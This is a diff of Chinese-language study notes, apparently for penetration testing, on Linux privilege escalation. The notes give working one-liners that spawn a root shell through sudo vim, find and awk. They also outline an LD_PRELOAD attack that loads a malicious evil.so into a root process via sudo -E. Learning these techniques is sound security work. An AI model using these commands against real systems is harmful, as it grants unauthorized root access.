@@ -1,9 +1,9 @@
-sudo -l：查找允许用sudo跑什么,需要免密
+sudo -l:查找允许用sudo跑什么,需要免密
 
-sudo -l 输出： (root) NOPASSWD: /usr/bin/vim
+sudo -l 输出: (root) NOPASSWD: /usr/bin/vim
         │
         ▼
-  借这个命令开子 shell：
+  借这个命令开子 shell:
   sudo vim -c ':!/bin/bash'
   sudo find . -exec /bin/sh \;
   sudo awk 'BEGIN{system("/bin/sh")}'
@@ -13,14 +13,14 @@ sudo -l 输出： (root) NOPASSWD: /usr/bin/vim
   root shell
 2
 3对动态链接命令执行时留下环境变量
-www-data要做的：
+www-data要做的:
         │
-        ├─ 写一个 evil.so   → 放哪？放 /tmp，/tmp 你可写 ✓
-        ├─ export LD_PRELOAD=/tmp/evil.so
+        ├─ 写一个 evil.so   → 放入可写目录
+        ├─ export LD_PRELOAD=/可写目录/evil.so
         └─ sudo -E /usr/bin/某程序
         │
         ▼
-   /usr/bin/某程序 本身没被动过还是root属主、只读
+   sudo -E(保留之前的环境变量) /usr/bin/某程序 调用允许的动态链接自动加载.so环境变量
         │
         ▼
    它启动时，动态链接器"额外"把 evil.so 塞进进程
